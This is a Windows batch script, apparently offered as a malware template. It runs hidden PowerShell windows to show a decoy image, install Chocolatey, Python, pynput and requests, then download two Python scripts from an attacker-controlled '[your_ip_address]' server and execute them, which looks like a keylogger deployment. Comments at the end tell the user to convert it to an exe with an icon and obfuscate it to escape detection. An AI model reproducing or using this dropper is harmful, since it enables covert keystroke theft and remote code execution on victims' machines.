@echo off
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://th.bing.com/th/id/OIP.6yHdb5-e5s7VQKjdsBjBNgHaHd?w=183&h=184&c=7&r=0&o=5&pid=1.7' -OutFile 'C:\Users\Public\Music\apple.png'"
"C:\Users\Public\Music\apple.png"
powershell.exe -WindowStyle Hidden -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
powershell.exe -WindowStyle Hidden -Command "choco install python -y"
powershell.exe -WindowStyle Hidden -Command "pip install pynput"
powershell.exe -WindowStyle Hidden -Command "pip install requests"
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://[your_ip_address]:8000/download/bdhe.py' -OutFile 'C:\Users\Public\Music\djsw.py'"
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://[your_ip_address]:8000/download/dnjr.py' -OutFile 'C:\Users\Public\Videos\fjek.py'"
powershell.exe -WindowStyle Hidden -Command "Start-Process -NoNewWindow python -ArgumentList 'c:/Users/Public/Music/djsw.py'"
powershell.exe -WindowStyle Hidden -Command "python 'c:/Users/Public/Videos/fjek.py'"

@REM                         // READ THIS //

@REM Enter your public IP address in the URL
@REM Try converting it to exe file with a with icon
@REM NOTE - Exe files are more suspicious and easy to detect
@REM Try obfuscating the bat or exe file